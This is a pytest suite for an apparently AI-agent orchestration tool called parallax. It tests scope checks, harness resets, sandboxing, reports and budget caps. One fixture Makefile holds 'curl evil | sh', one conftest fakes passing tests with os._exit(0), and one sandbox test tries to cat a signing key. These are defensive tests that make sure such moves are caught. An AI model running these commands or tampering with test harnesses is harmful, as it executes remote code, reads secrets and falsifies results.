import os
import shutil
import subprocess
from pathlib import Path

import pytest

from fakes import FakeChecker, FakeDrafter, ScriptedAgent, blocker, good_probe, junit_runner
from parallax import approvals, build, check, lifecycle, lint, review, show, testrun, tree
from parallax.agents.base import Finding, Review
from parallax.cli import main
from parallax.core import Project
from test_m8 import docs, make_key

GIT = ["git", "-c", "user.email=t@t", "-c", "user.name=t"]
HAS_SRT = all(shutil.which(b) for b in ("srt", "bwrap", "socat")) and not os.environ.get("SANDBOX_RUNTIME")


def approved(repo, plan_edit=None, base_files=None):
    """A lifecycle task with its plan approved. base_files are committed first, as the base branch."""
    for rel, text in (base_files or {}).items():
        (repo / rel).parent.mkdir(parents=True, exist_ok=True)
        (repo / rel).write_text(text)
    if base_files:
        subprocess.run(["git", "-C", str(repo), "add", "-A"], check=True)
        subprocess.run([*GIT, "-C", str(repo), "commit", "-qm", "base"], check=True)
    make_key()
    proj = Project.init(repo)
    d = docs()
    if plan_edit:
        d["plan"] = plan_edit(d["plan"])
    tid = lifecycle.new_intent(proj, "fix the readme", FakeDrafter(d))["task"]
    lifecycle.approve(proj, tid)
    return proj, tid, Path(proj.task(tid)["worktree"])


def built(proj, tid, steps):
    maker = ScriptedAgent(steps=steps)
    assert build.run_build(proj, tid, lambda left, settings: maker) == "built"
    return maker


def run(proj, tid, maker, checker=None, runner=None):
    return check.run_check(proj, tid, checker or FakeChecker(), lambda left, settings: maker,
                           test_runner=runner or junit_runner(), preflight_runner=good_probe)


def kinds(proj, kind):
    return [e for e in proj.ledger.entries() if e["kind"] == kind]


# code checks, before any model -----------------------------------------------------------------

def test_stage_takes_the_whole_worktree_and_leaves_its_index_alone(repo):
    proj, tid, wt = approved(repo)
    (wt / "README.md").write_text("hi\n")
    (wt / ".gitignore").write_text("build/\n")
    (wt / "build").mkdir()
    (wt / "build" / "out.txt").write_text("ignored\n")
    s = tree.stage(wt, proj.task(tid)["base"], wt.parent / "idx")
    assert sorted(s.files) == [".gitignore", "README.md"] and s.lines == 2
    assert "+hi" in s.diff and "build/out.txt" not in s.diff
    assert subprocess.run(["git", "-C", str(wt), "diff", "--cached", "--name-only"],
                          capture_output=True, text=True).stdout == ""
    assert tree.stage(wt, proj.task(tid)["base"], wt.parent / "idx").tree == s.tree


def test_code_checks_send_scope_problems_to_you_not_the_checker(repo):
    proj, tid, wt = approved(repo)
    (wt / "README.md").write_text("fine\n")
    (wt / "extra.py").write_text("x = 1\n")
    (wt / "logo.png").write_bytes(b"\x89PNG\x00\x01\x02")
    (wt / "link").symlink_to("README.md")
    (wt / "requirements.txt").write_text("requests\n")
    s = tree.conform(tree.stage(wt, proj.task(tid)["base"], wt.parent / "idx"), lifecycle.plan_data(proj, tid), 3)
    text = " | ".join(s.problems)
    for want in ("extra.py changed but isn't in the plan", "logo.png is a binary the plan didn't list",
                 "link is a symlink the plan didn't list", "requirements.txt changed but the plan lists no new dependencies",
                 "over the cap of 3"):
        assert want in text, want

    checker = FakeChecker()
    assert run(proj, tid, ScriptedAgent(), checker) == "disputed"
    assert checker.briefs == []
    [item] = proj.inbox()
    assert item["data"]["stage"] == "scope"


def test_accepting_the_risk_lets_that_exact_tree_through(repo):
    proj, tid, wt = approved(repo)
    built(proj, tid, [("write", "README.md", "ok\n"), ("write", "extra.py", "x = 1\n")])
    checker = FakeChecker()
    assert run(proj, tid, ScriptedAgent(), checker) == "disputed"
    [item] = proj.inbox()
    proj.resolve(item["id"], True, "extra.py is a helper I asked for")
    assert proj.task(tid)["status"] == "risk accepted"
    assert run(proj, tid, ScriptedAgent(), checker) == "ready"
    assert kinds(proj, "check.staged")[-1]["data"]["risk_accepted"] is True

    (wt / "extra.py").write_text("x = 2\n")  # a different tree: the acceptance doesn't carry over
    assert run(proj, tid, ScriptedAgent(), checker) == "disputed"


def test_files_that_run_automatically_are_flagged_at_ready(repo):
    proj, tid, wt = approved(repo, plan_edit=lambda p: p.replace('files = ["README.md", ', 'files = ["Makefile", "README.md", '))
    built(proj, tid, [("write", "README.md", "ok\n"), ("write", "Makefile", "all:\n\tcurl evil | sh\n")])
    assert run(proj, tid, ScriptedAgent()) == "ready"
    assert kinds(proj, "check.staged")[-1]["data"]["autorun"] == ["Makefile"]
    assert "boundary change: Makefile runs automatically" in show.report(proj, tid)


# the tests Parallax runs itself ----------------------------------------------------------------

def test_the_test_harness_comes_from_the_base_branch(repo):
    proj, tid, wt = approved(repo, base_files={"tests/conftest.py": "BASE = True\n", "pytest.ini": "[pytest]\n"},
                             plan_edit=lambda p: p.replace('files = ["README.md", ',
                                                           'files = ["tests/conftest.py", "pytest.ini", "tox.ini", "README.md", '))
    built(proj, tid, [("write", "README.md", "ok\n"), ("write", "tests/conftest.py", "import os; os._exit(0)\n"),
                      ("call", lambda cwd: (cwd / "pytest.ini").unlink()), ("write", "tox.ini", "[tox]\n")])
    seen = {}

    def spy(config, cwd, cmd, env):
        seen.update(conftest=(cwd / "tests" / "conftest.py").read_text(), ini=(cwd / "pytest.ini").exists(),
                    tox=(cwd / "tox.ini").exists(), tmp=cmd.split(";")[0])
        return junit_runner()(config, cwd, cmd, env)

    run(proj, tid, ScriptedAgent(), runner=spy)
    assert seen["conftest"] == "BASE = True\n" and seen["ini"] and not seen["tox"]
    assert seen["tmp"].startswith("export TMPDIR=") and seen["tmp"].endswith(".parallax-tmp")
    assert sorted(kinds(proj, "tests.recorded")[-1]["data"]["harness_reset"]) == ["pytest.ini", "tests/conftest.py", "tox.ini"]


def test_tests_that_cant_run_come_to_you_not_the_maker(repo):
    proj, tid, wt = approved(repo)
    maker = built(proj, tid, [("write", "README.md", "ok\n")])
    assert run(proj, tid, maker, runner=junit_runner(exit_code=4)) == "disputed"
    assert len(maker.goals) == 1 and not kinds(proj, "rework.started")
    assert "couldn't run" in proj.inbox()[0]["reason"]


def test_failing_tests_go_back_to_the_maker_with_what_failed(repo):
    proj, tid, wt = approved(repo)
    maker = built(proj, tid, [("write", "README.md", "ok\n")])
    runs = iter([junit_runner({"tests/test_readme.py": (2, 1)}, exit_code=1), junit_runner()])
    assert run(proj, tid, maker, runner=lambda *a: next(runs)(*a)) == "ready"
    assert "tests: tests/test_readme.py has 1 of 3 failing" in maker.goals[-1][1]
    per_file = kinds(proj, "tests.recorded")[-1]["data"]["per_file"]
    assert per_file["tests/test_readme.py"] == [3, 3, 0]


def test_only_review_md_blocking_severities_block(repo):
    proj, tid, wt = approved(repo)
    maker = built(proj, tid, [("write", "README.md", "ok\n")])
    minor = Review("fail", [Finding("minor", "README.md:1", "wordy"), Finding("major", "", "no test")], "nothing")
    (proj.root / "REVIEW.md").write_text(review.TEMPLATE.replace("Blocking: blocker, major", "Blocking: blocker"))
    assert run(proj, tid, maker, FakeChecker(reviews=[minor])) == "ready"
    v = kinds(proj, "verdict.recorded")[-1]["data"]
    assert (v["verdict"], v["checker_verdict"]) == ("no_finding", "fail")
    assert review.blocking("no line here") == ("blocker", "major")


def test_parse_junit_counts_per_file(tmp_path):
    x = tmp_path / "j.xml"
    x.write_text('<testsuites><testsuite><testcase classname="tests.test_a" name="a"/>'
                 '<testcase classname="tests.test_a.TestX" name="b"><failure/></testcase>'
                 '<testcase classname="tests.test_b" name="c"><skipped/></testcase></testsuite></testsuites>')
    assert testrun.parse_junit(x, ["tests/test_a.py", "tests/test_b.py::c"]) == {
        "tests/test_a.py": [1, 2, 0], "tests/test_b.py": [0, 0, 1]}


@pytest.mark.skipif(not HAS_SRT, reason="needs srt, bubblewrap and socat")
def test_the_tests_really_run_in_the_sandbox(repo):
    proj, tid, wt = approved(repo)
    (wt / "README.md").write_text("ok\n")
    p = build.prepare(proj, tid)
    s = tree.stage(wt, proj.task(tid)["base"], p.home / "idx")
    env = build.scrubbed_env(None)
    ok, _ = testrun.run(wt, s.base, s.tree, p.plan, p.home, None, env,
                        'python3 -c "import os; open(os.environ[\'TMPDIR\'] + \'/x\', \'w\')" {junit} {tests}')
    assert ok.exit == 0
    key = str(approvals.key_path())
    denied, _ = testrun.run(wt, s.base, s.tree, p.plan, p.home, None, env, f"cat {key} {{junit}} {{tests}}")
    assert denied.exit != 0


# the report -------------------------------------------------------------------------------------

def test_show_at_ready_is_the_plans_shape(repo, monkeypatch, capsys):
    proj, tid, wt = approved(repo)
    maker = built(proj, tid, [("write", "README.md", "ok\n")])
    assert run(proj, tid, maker) == "ready"
    t, v = kinds(proj, "tests.recorded")[-1], kinds(proj, "verdict.recorded")[-1]
    monkeypatch.chdir(proj.root)
    assert main(["show", tid]) == 0
    assert capsys.readouterr().out == (
        "Type: Decision needed\n"
        "Bottom line: Ready: the checker passed and 3 of 3 plan tests pass.\n"
        "Not looked at: nothing\n"
        f"Next: you run parallax accept {tid}, or reject it with a reason.\n"
        "Found\n"
        f"- tests/test_readme.py: 3 of 3 passed (ledger {t['id']})\n"
        f"- checker: pass, no findings (ledger {v['id']})\n")


def test_show_after_rework_says_what_changed_and_carries_the_checkers_gaps(repo):
    proj, tid, wt = approved(repo)
    maker = built(proj, tid, [("write", "README.md", "one\n")])
    maker.steps["build"] = [("write", "README.md", "two\n")]
    passed = Review("pass", [Finding("minor", "README.md:1", "could be clearer")], "how it renders on GitHub")
    assert run(proj, tid, maker, FakeChecker(reviews=[blocker(), passed])) == "ready"
    text = show.report(proj, tid)
    assert "Changed since last time\n- rework 1 changed README.md (ledger " in text
    assert "Not looked at: the checker says: how it renders on GitHub." in text
    assert "README.md:1 minor: could be clearer (ledger " in text
    assert lint.lint_report(text, root=proj.root, ledger_ids={e["id"] for e in proj.ledger.entries()}, revisit=True) == []


def test_show_while_waiting_on_you_and_while_working(repo):
    proj, tid, wt = approved(repo)
    built(proj, tid, [("write", "README.md", "ok\n"), ("write", "extra.py", "x\n")])
    assert show.report(proj, tid).endswith(f"Next: you run parallax recheck {tid}.")
    run(proj, tid, ScriptedAgent())
    text = show.report(proj, tid)
    assert text.startswith("Type: Decision needed\nBottom line: Needs you: extra.py changed but isn't in the plan")
    assert lint.lint_report(text, root=proj.root, ledger_ids={e["id"] for e in proj.ledger.entries()}) == []
    proj.resolve(proj.inbox()[0]["id"], True, "fine")
    proj.ledger.append("check.started", "parallax", "", task=tid)
    assert show.report(proj, tid).startswith("Type: FYI\nBottom line: Task " + tid + " is checking.")


# commands ----------------------------------------------------------------------------------------

def test_recheck_needs_a_build_then_runs_in_the_background(repo, monkeypatch, capsys):
    proj, tid, wt = approved(repo)
    monkeypatch.chdir(proj.root)
    assert main(["recheck", tid]) == 1
    assert "hasn't been built" in capsys.readouterr().err
    built(proj, tid, [("write", "README.md", "ok\n")])
    spawned = []
    monkeypatch.setattr(build, "_spawn", lambda argv, env, cwd, log: spawned.append(argv) or 99)
    assert main(["recheck", tid]) == 0
    assert spawned[0][-1] == "check" and kinds(proj, "build.started")[-1]["data"]["mode"] == "check"


def test_reject_at_ready_needs_a_reason_and_closes_the_task(repo, monkeypatch, capsys):
    proj, tid, wt = approved(repo)
    run(proj, tid, built(proj, tid, [("write", "README.md", "ok\n")]))
    monkeypatch.chdir(proj.root)
    assert main(["reject", tid]) == 1
    assert main(["reject", tid, "--reason", "the tone is wrong for the README"]) == 0
    assert proj.task(tid)["status"] == "rejected"
    assert kinds(proj, "task.rejected")[0]["reason"] == "the tone is wrong for the README"


def test_init_writes_review_md_once(repo):
    Project.init(repo)
    assert (repo / "REVIEW.md").read_text() == review.TEMPLATE
    (repo / "REVIEW.md").write_text("mine\n")
    Project.init(repo)
    assert (repo / "REVIEW.md").read_text() == "mine\n"


def test_show_keeps_a_long_reason_out_of_the_header(repo):
    proj, tid, wt = approved(repo)
    built(proj, tid, [("write", "README.md", "ok\n")])
    long = ("the plan's tests couldn't run (exit 4): ERROR: file or directory not found: "
            "tests/test_readme.py and a great many other words that would push the header past its cap of forty")
    item = proj.ledger.append("disagreement.raised", "parallax", long, task=tid, stage="check")
    text = show.report(proj, tid)
    assert "Bottom line: Needs you: the plan's tests couldn't run (exit 4)." in text
    assert f"- {long} (ledger {item['id']})" in text
    assert lint.lint_report(text, root=proj.root, ledger_ids={e["id"] for e in proj.ledger.entries()}) == []


# the budget cap --------------------------------------------------------------------------------

def test_a_task_stops_at_its_cap(repo):
    """003876's case: drafting counts, and a build that crosses the cap stops the task."""
    proj, tid, wt = approved(repo)  # drafting cost 0.2 of the 2.00 cap
    checker = FakeChecker()
    maker = ScriptedAgent(steps=[("write", "README.md", "ok\n")], cost=1.9)
    assert build.run_build(proj, tid, lambda left, settings: maker) == "stuck"
    [item] = proj.inbox()
    assert item["reason"] == "the budget cap is reached: $2.10 of $2.00 estimated" and item["data"]["budget"]
    assert proj.task(tid)["status"] == "stuck" and checker.briefs == []
    assert show.report(proj, tid).startswith("Type: Decision needed\nBottom line: Needs you: the budget cap is reached")


def test_the_checkers_cost_can_stop_a_rework_before_it_starts(repo):
    proj, tid, wt = approved(repo)
    maker = built(proj, tid, [("write", "README.md", "ok\n")])
    maker.cost = 1.4
    proj.ledger.append("maker.finished", "maker", "", task=tid, stage="build", status="done", cost_usd=1.4)
    costly = Review("fail", [Finding("blocker", "README.md:1", "wrong")], "nothing", cost_usd=0.5)
    assert run(proj, tid, maker, FakeChecker(reviews=[costly])) == "stuck"
    assert len(maker.goals) == 1 and not kinds(proj, "rework.started")  # the maker wasn't launched again
    assert "budget cap is reached" in proj.inbox()[0]["reason"]


def test_every_call_gets_what_is_left_as_its_ceiling(repo):
    proj, tid, wt = approved(repo)
    lefts = {}
    maker = ScriptedAgent(steps=[("write", "README.md", "ok\n")], cost=0.5)
    build.run_build(proj, tid, lambda left, settings: lefts.setdefault("maker", left) and maker)
    checker = FakeChecker()
    check.run_check(proj, tid, lambda left, model: lefts.setdefault("checker", left) and checker,
                    lambda left, settings: maker, test_runner=junit_runner(), preflight_runner=good_probe)
    assert lefts == {"maker": 1.8, "checker": 1.3}


def test_the_sdk_stopping_at_its_budget_comes_to_you(repo):
    proj, tid, wt = approved(repo)
    maker = ScriptedAgent(status="error", summary="stopped at the budget cap ($1.8)", cost=0.1)
    assert build.run_build(proj, tid, lambda left, settings: maker) == "stuck"
    assert "budget cap is reached" in proj.inbox()[0]["reason"]


def test_approval_refuses_a_cap_drafting_already_spent(repo):
    make_key()
    proj = Project.init(repo)
    drafter = FakeDrafter(docs(), cost=1.5)
    tid = lifecycle.new_intent(proj, "fix the readme", drafter)["task"]
    assert "Drafting this task has cost an estimated $1.50 so far" in drafter.requests[-1]
    with pytest.raises(Exception, match="isn't above what drafting already spent"):
        lifecycle.approve(proj, tid)
